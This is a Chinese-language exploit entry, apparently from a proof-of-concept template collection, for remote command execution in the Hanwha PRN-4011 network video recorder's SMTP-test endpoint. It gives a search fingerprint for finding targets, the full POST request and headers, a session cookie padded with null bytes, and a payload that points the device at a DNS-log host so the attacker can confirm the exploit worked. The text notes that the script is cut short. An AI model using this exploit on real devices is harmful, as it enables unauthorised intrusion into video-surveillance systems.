# Hanwha-PRN-4011network-mail-smtp-test远程命令执行漏洞

- **系统**：Hanwha　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`body="$.nvr.model_name="`
- **请求**：`POST /index.php/network/network_mail_smtp_test HTTP/1.1`
- **关键头**：`Content-Length: 290`　`Content-Type: application/x-www-form-urlencoded`　`Cookie: DATA2=+7s9nS0/8whIc/IYm4Sg2A==; POE_SWITCH_STATUS=1; cs_id=1775619189; ss_id=101…`　`id: Hanwha-PRN-4011-network-mail-RCE`　`name: Hanwha-PRN-4011-network-mail-RCE`　`author: XXZ`　`severity: high`

**请求体 / payload**
```
smtp={"COMMAND":"2416","user_cnt":"1","sender_email":"localhost@test.net","url":"DNSLOG.COM","port":"25","user":"","use_auth":0,"security":"0","tcp_port":"4520","webviewer_port":"8081","retun_test_value":5,"passwd":""}&client_session=987099789
- raw:
-
Host: {{Hostname}}
Content-Length: 290
Content-Type: application/x-www-form-urlencoded
Cookie: DATA2=+7s9nS0/8whIc/IYm4Sg2A==; POE_SWITCH_STATUS=1; cs_id=1775619189; ss_id=1012484%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00…（脚本共 1652 字，完整版见原文）
```
- **预期**：200　|　Dnslog回显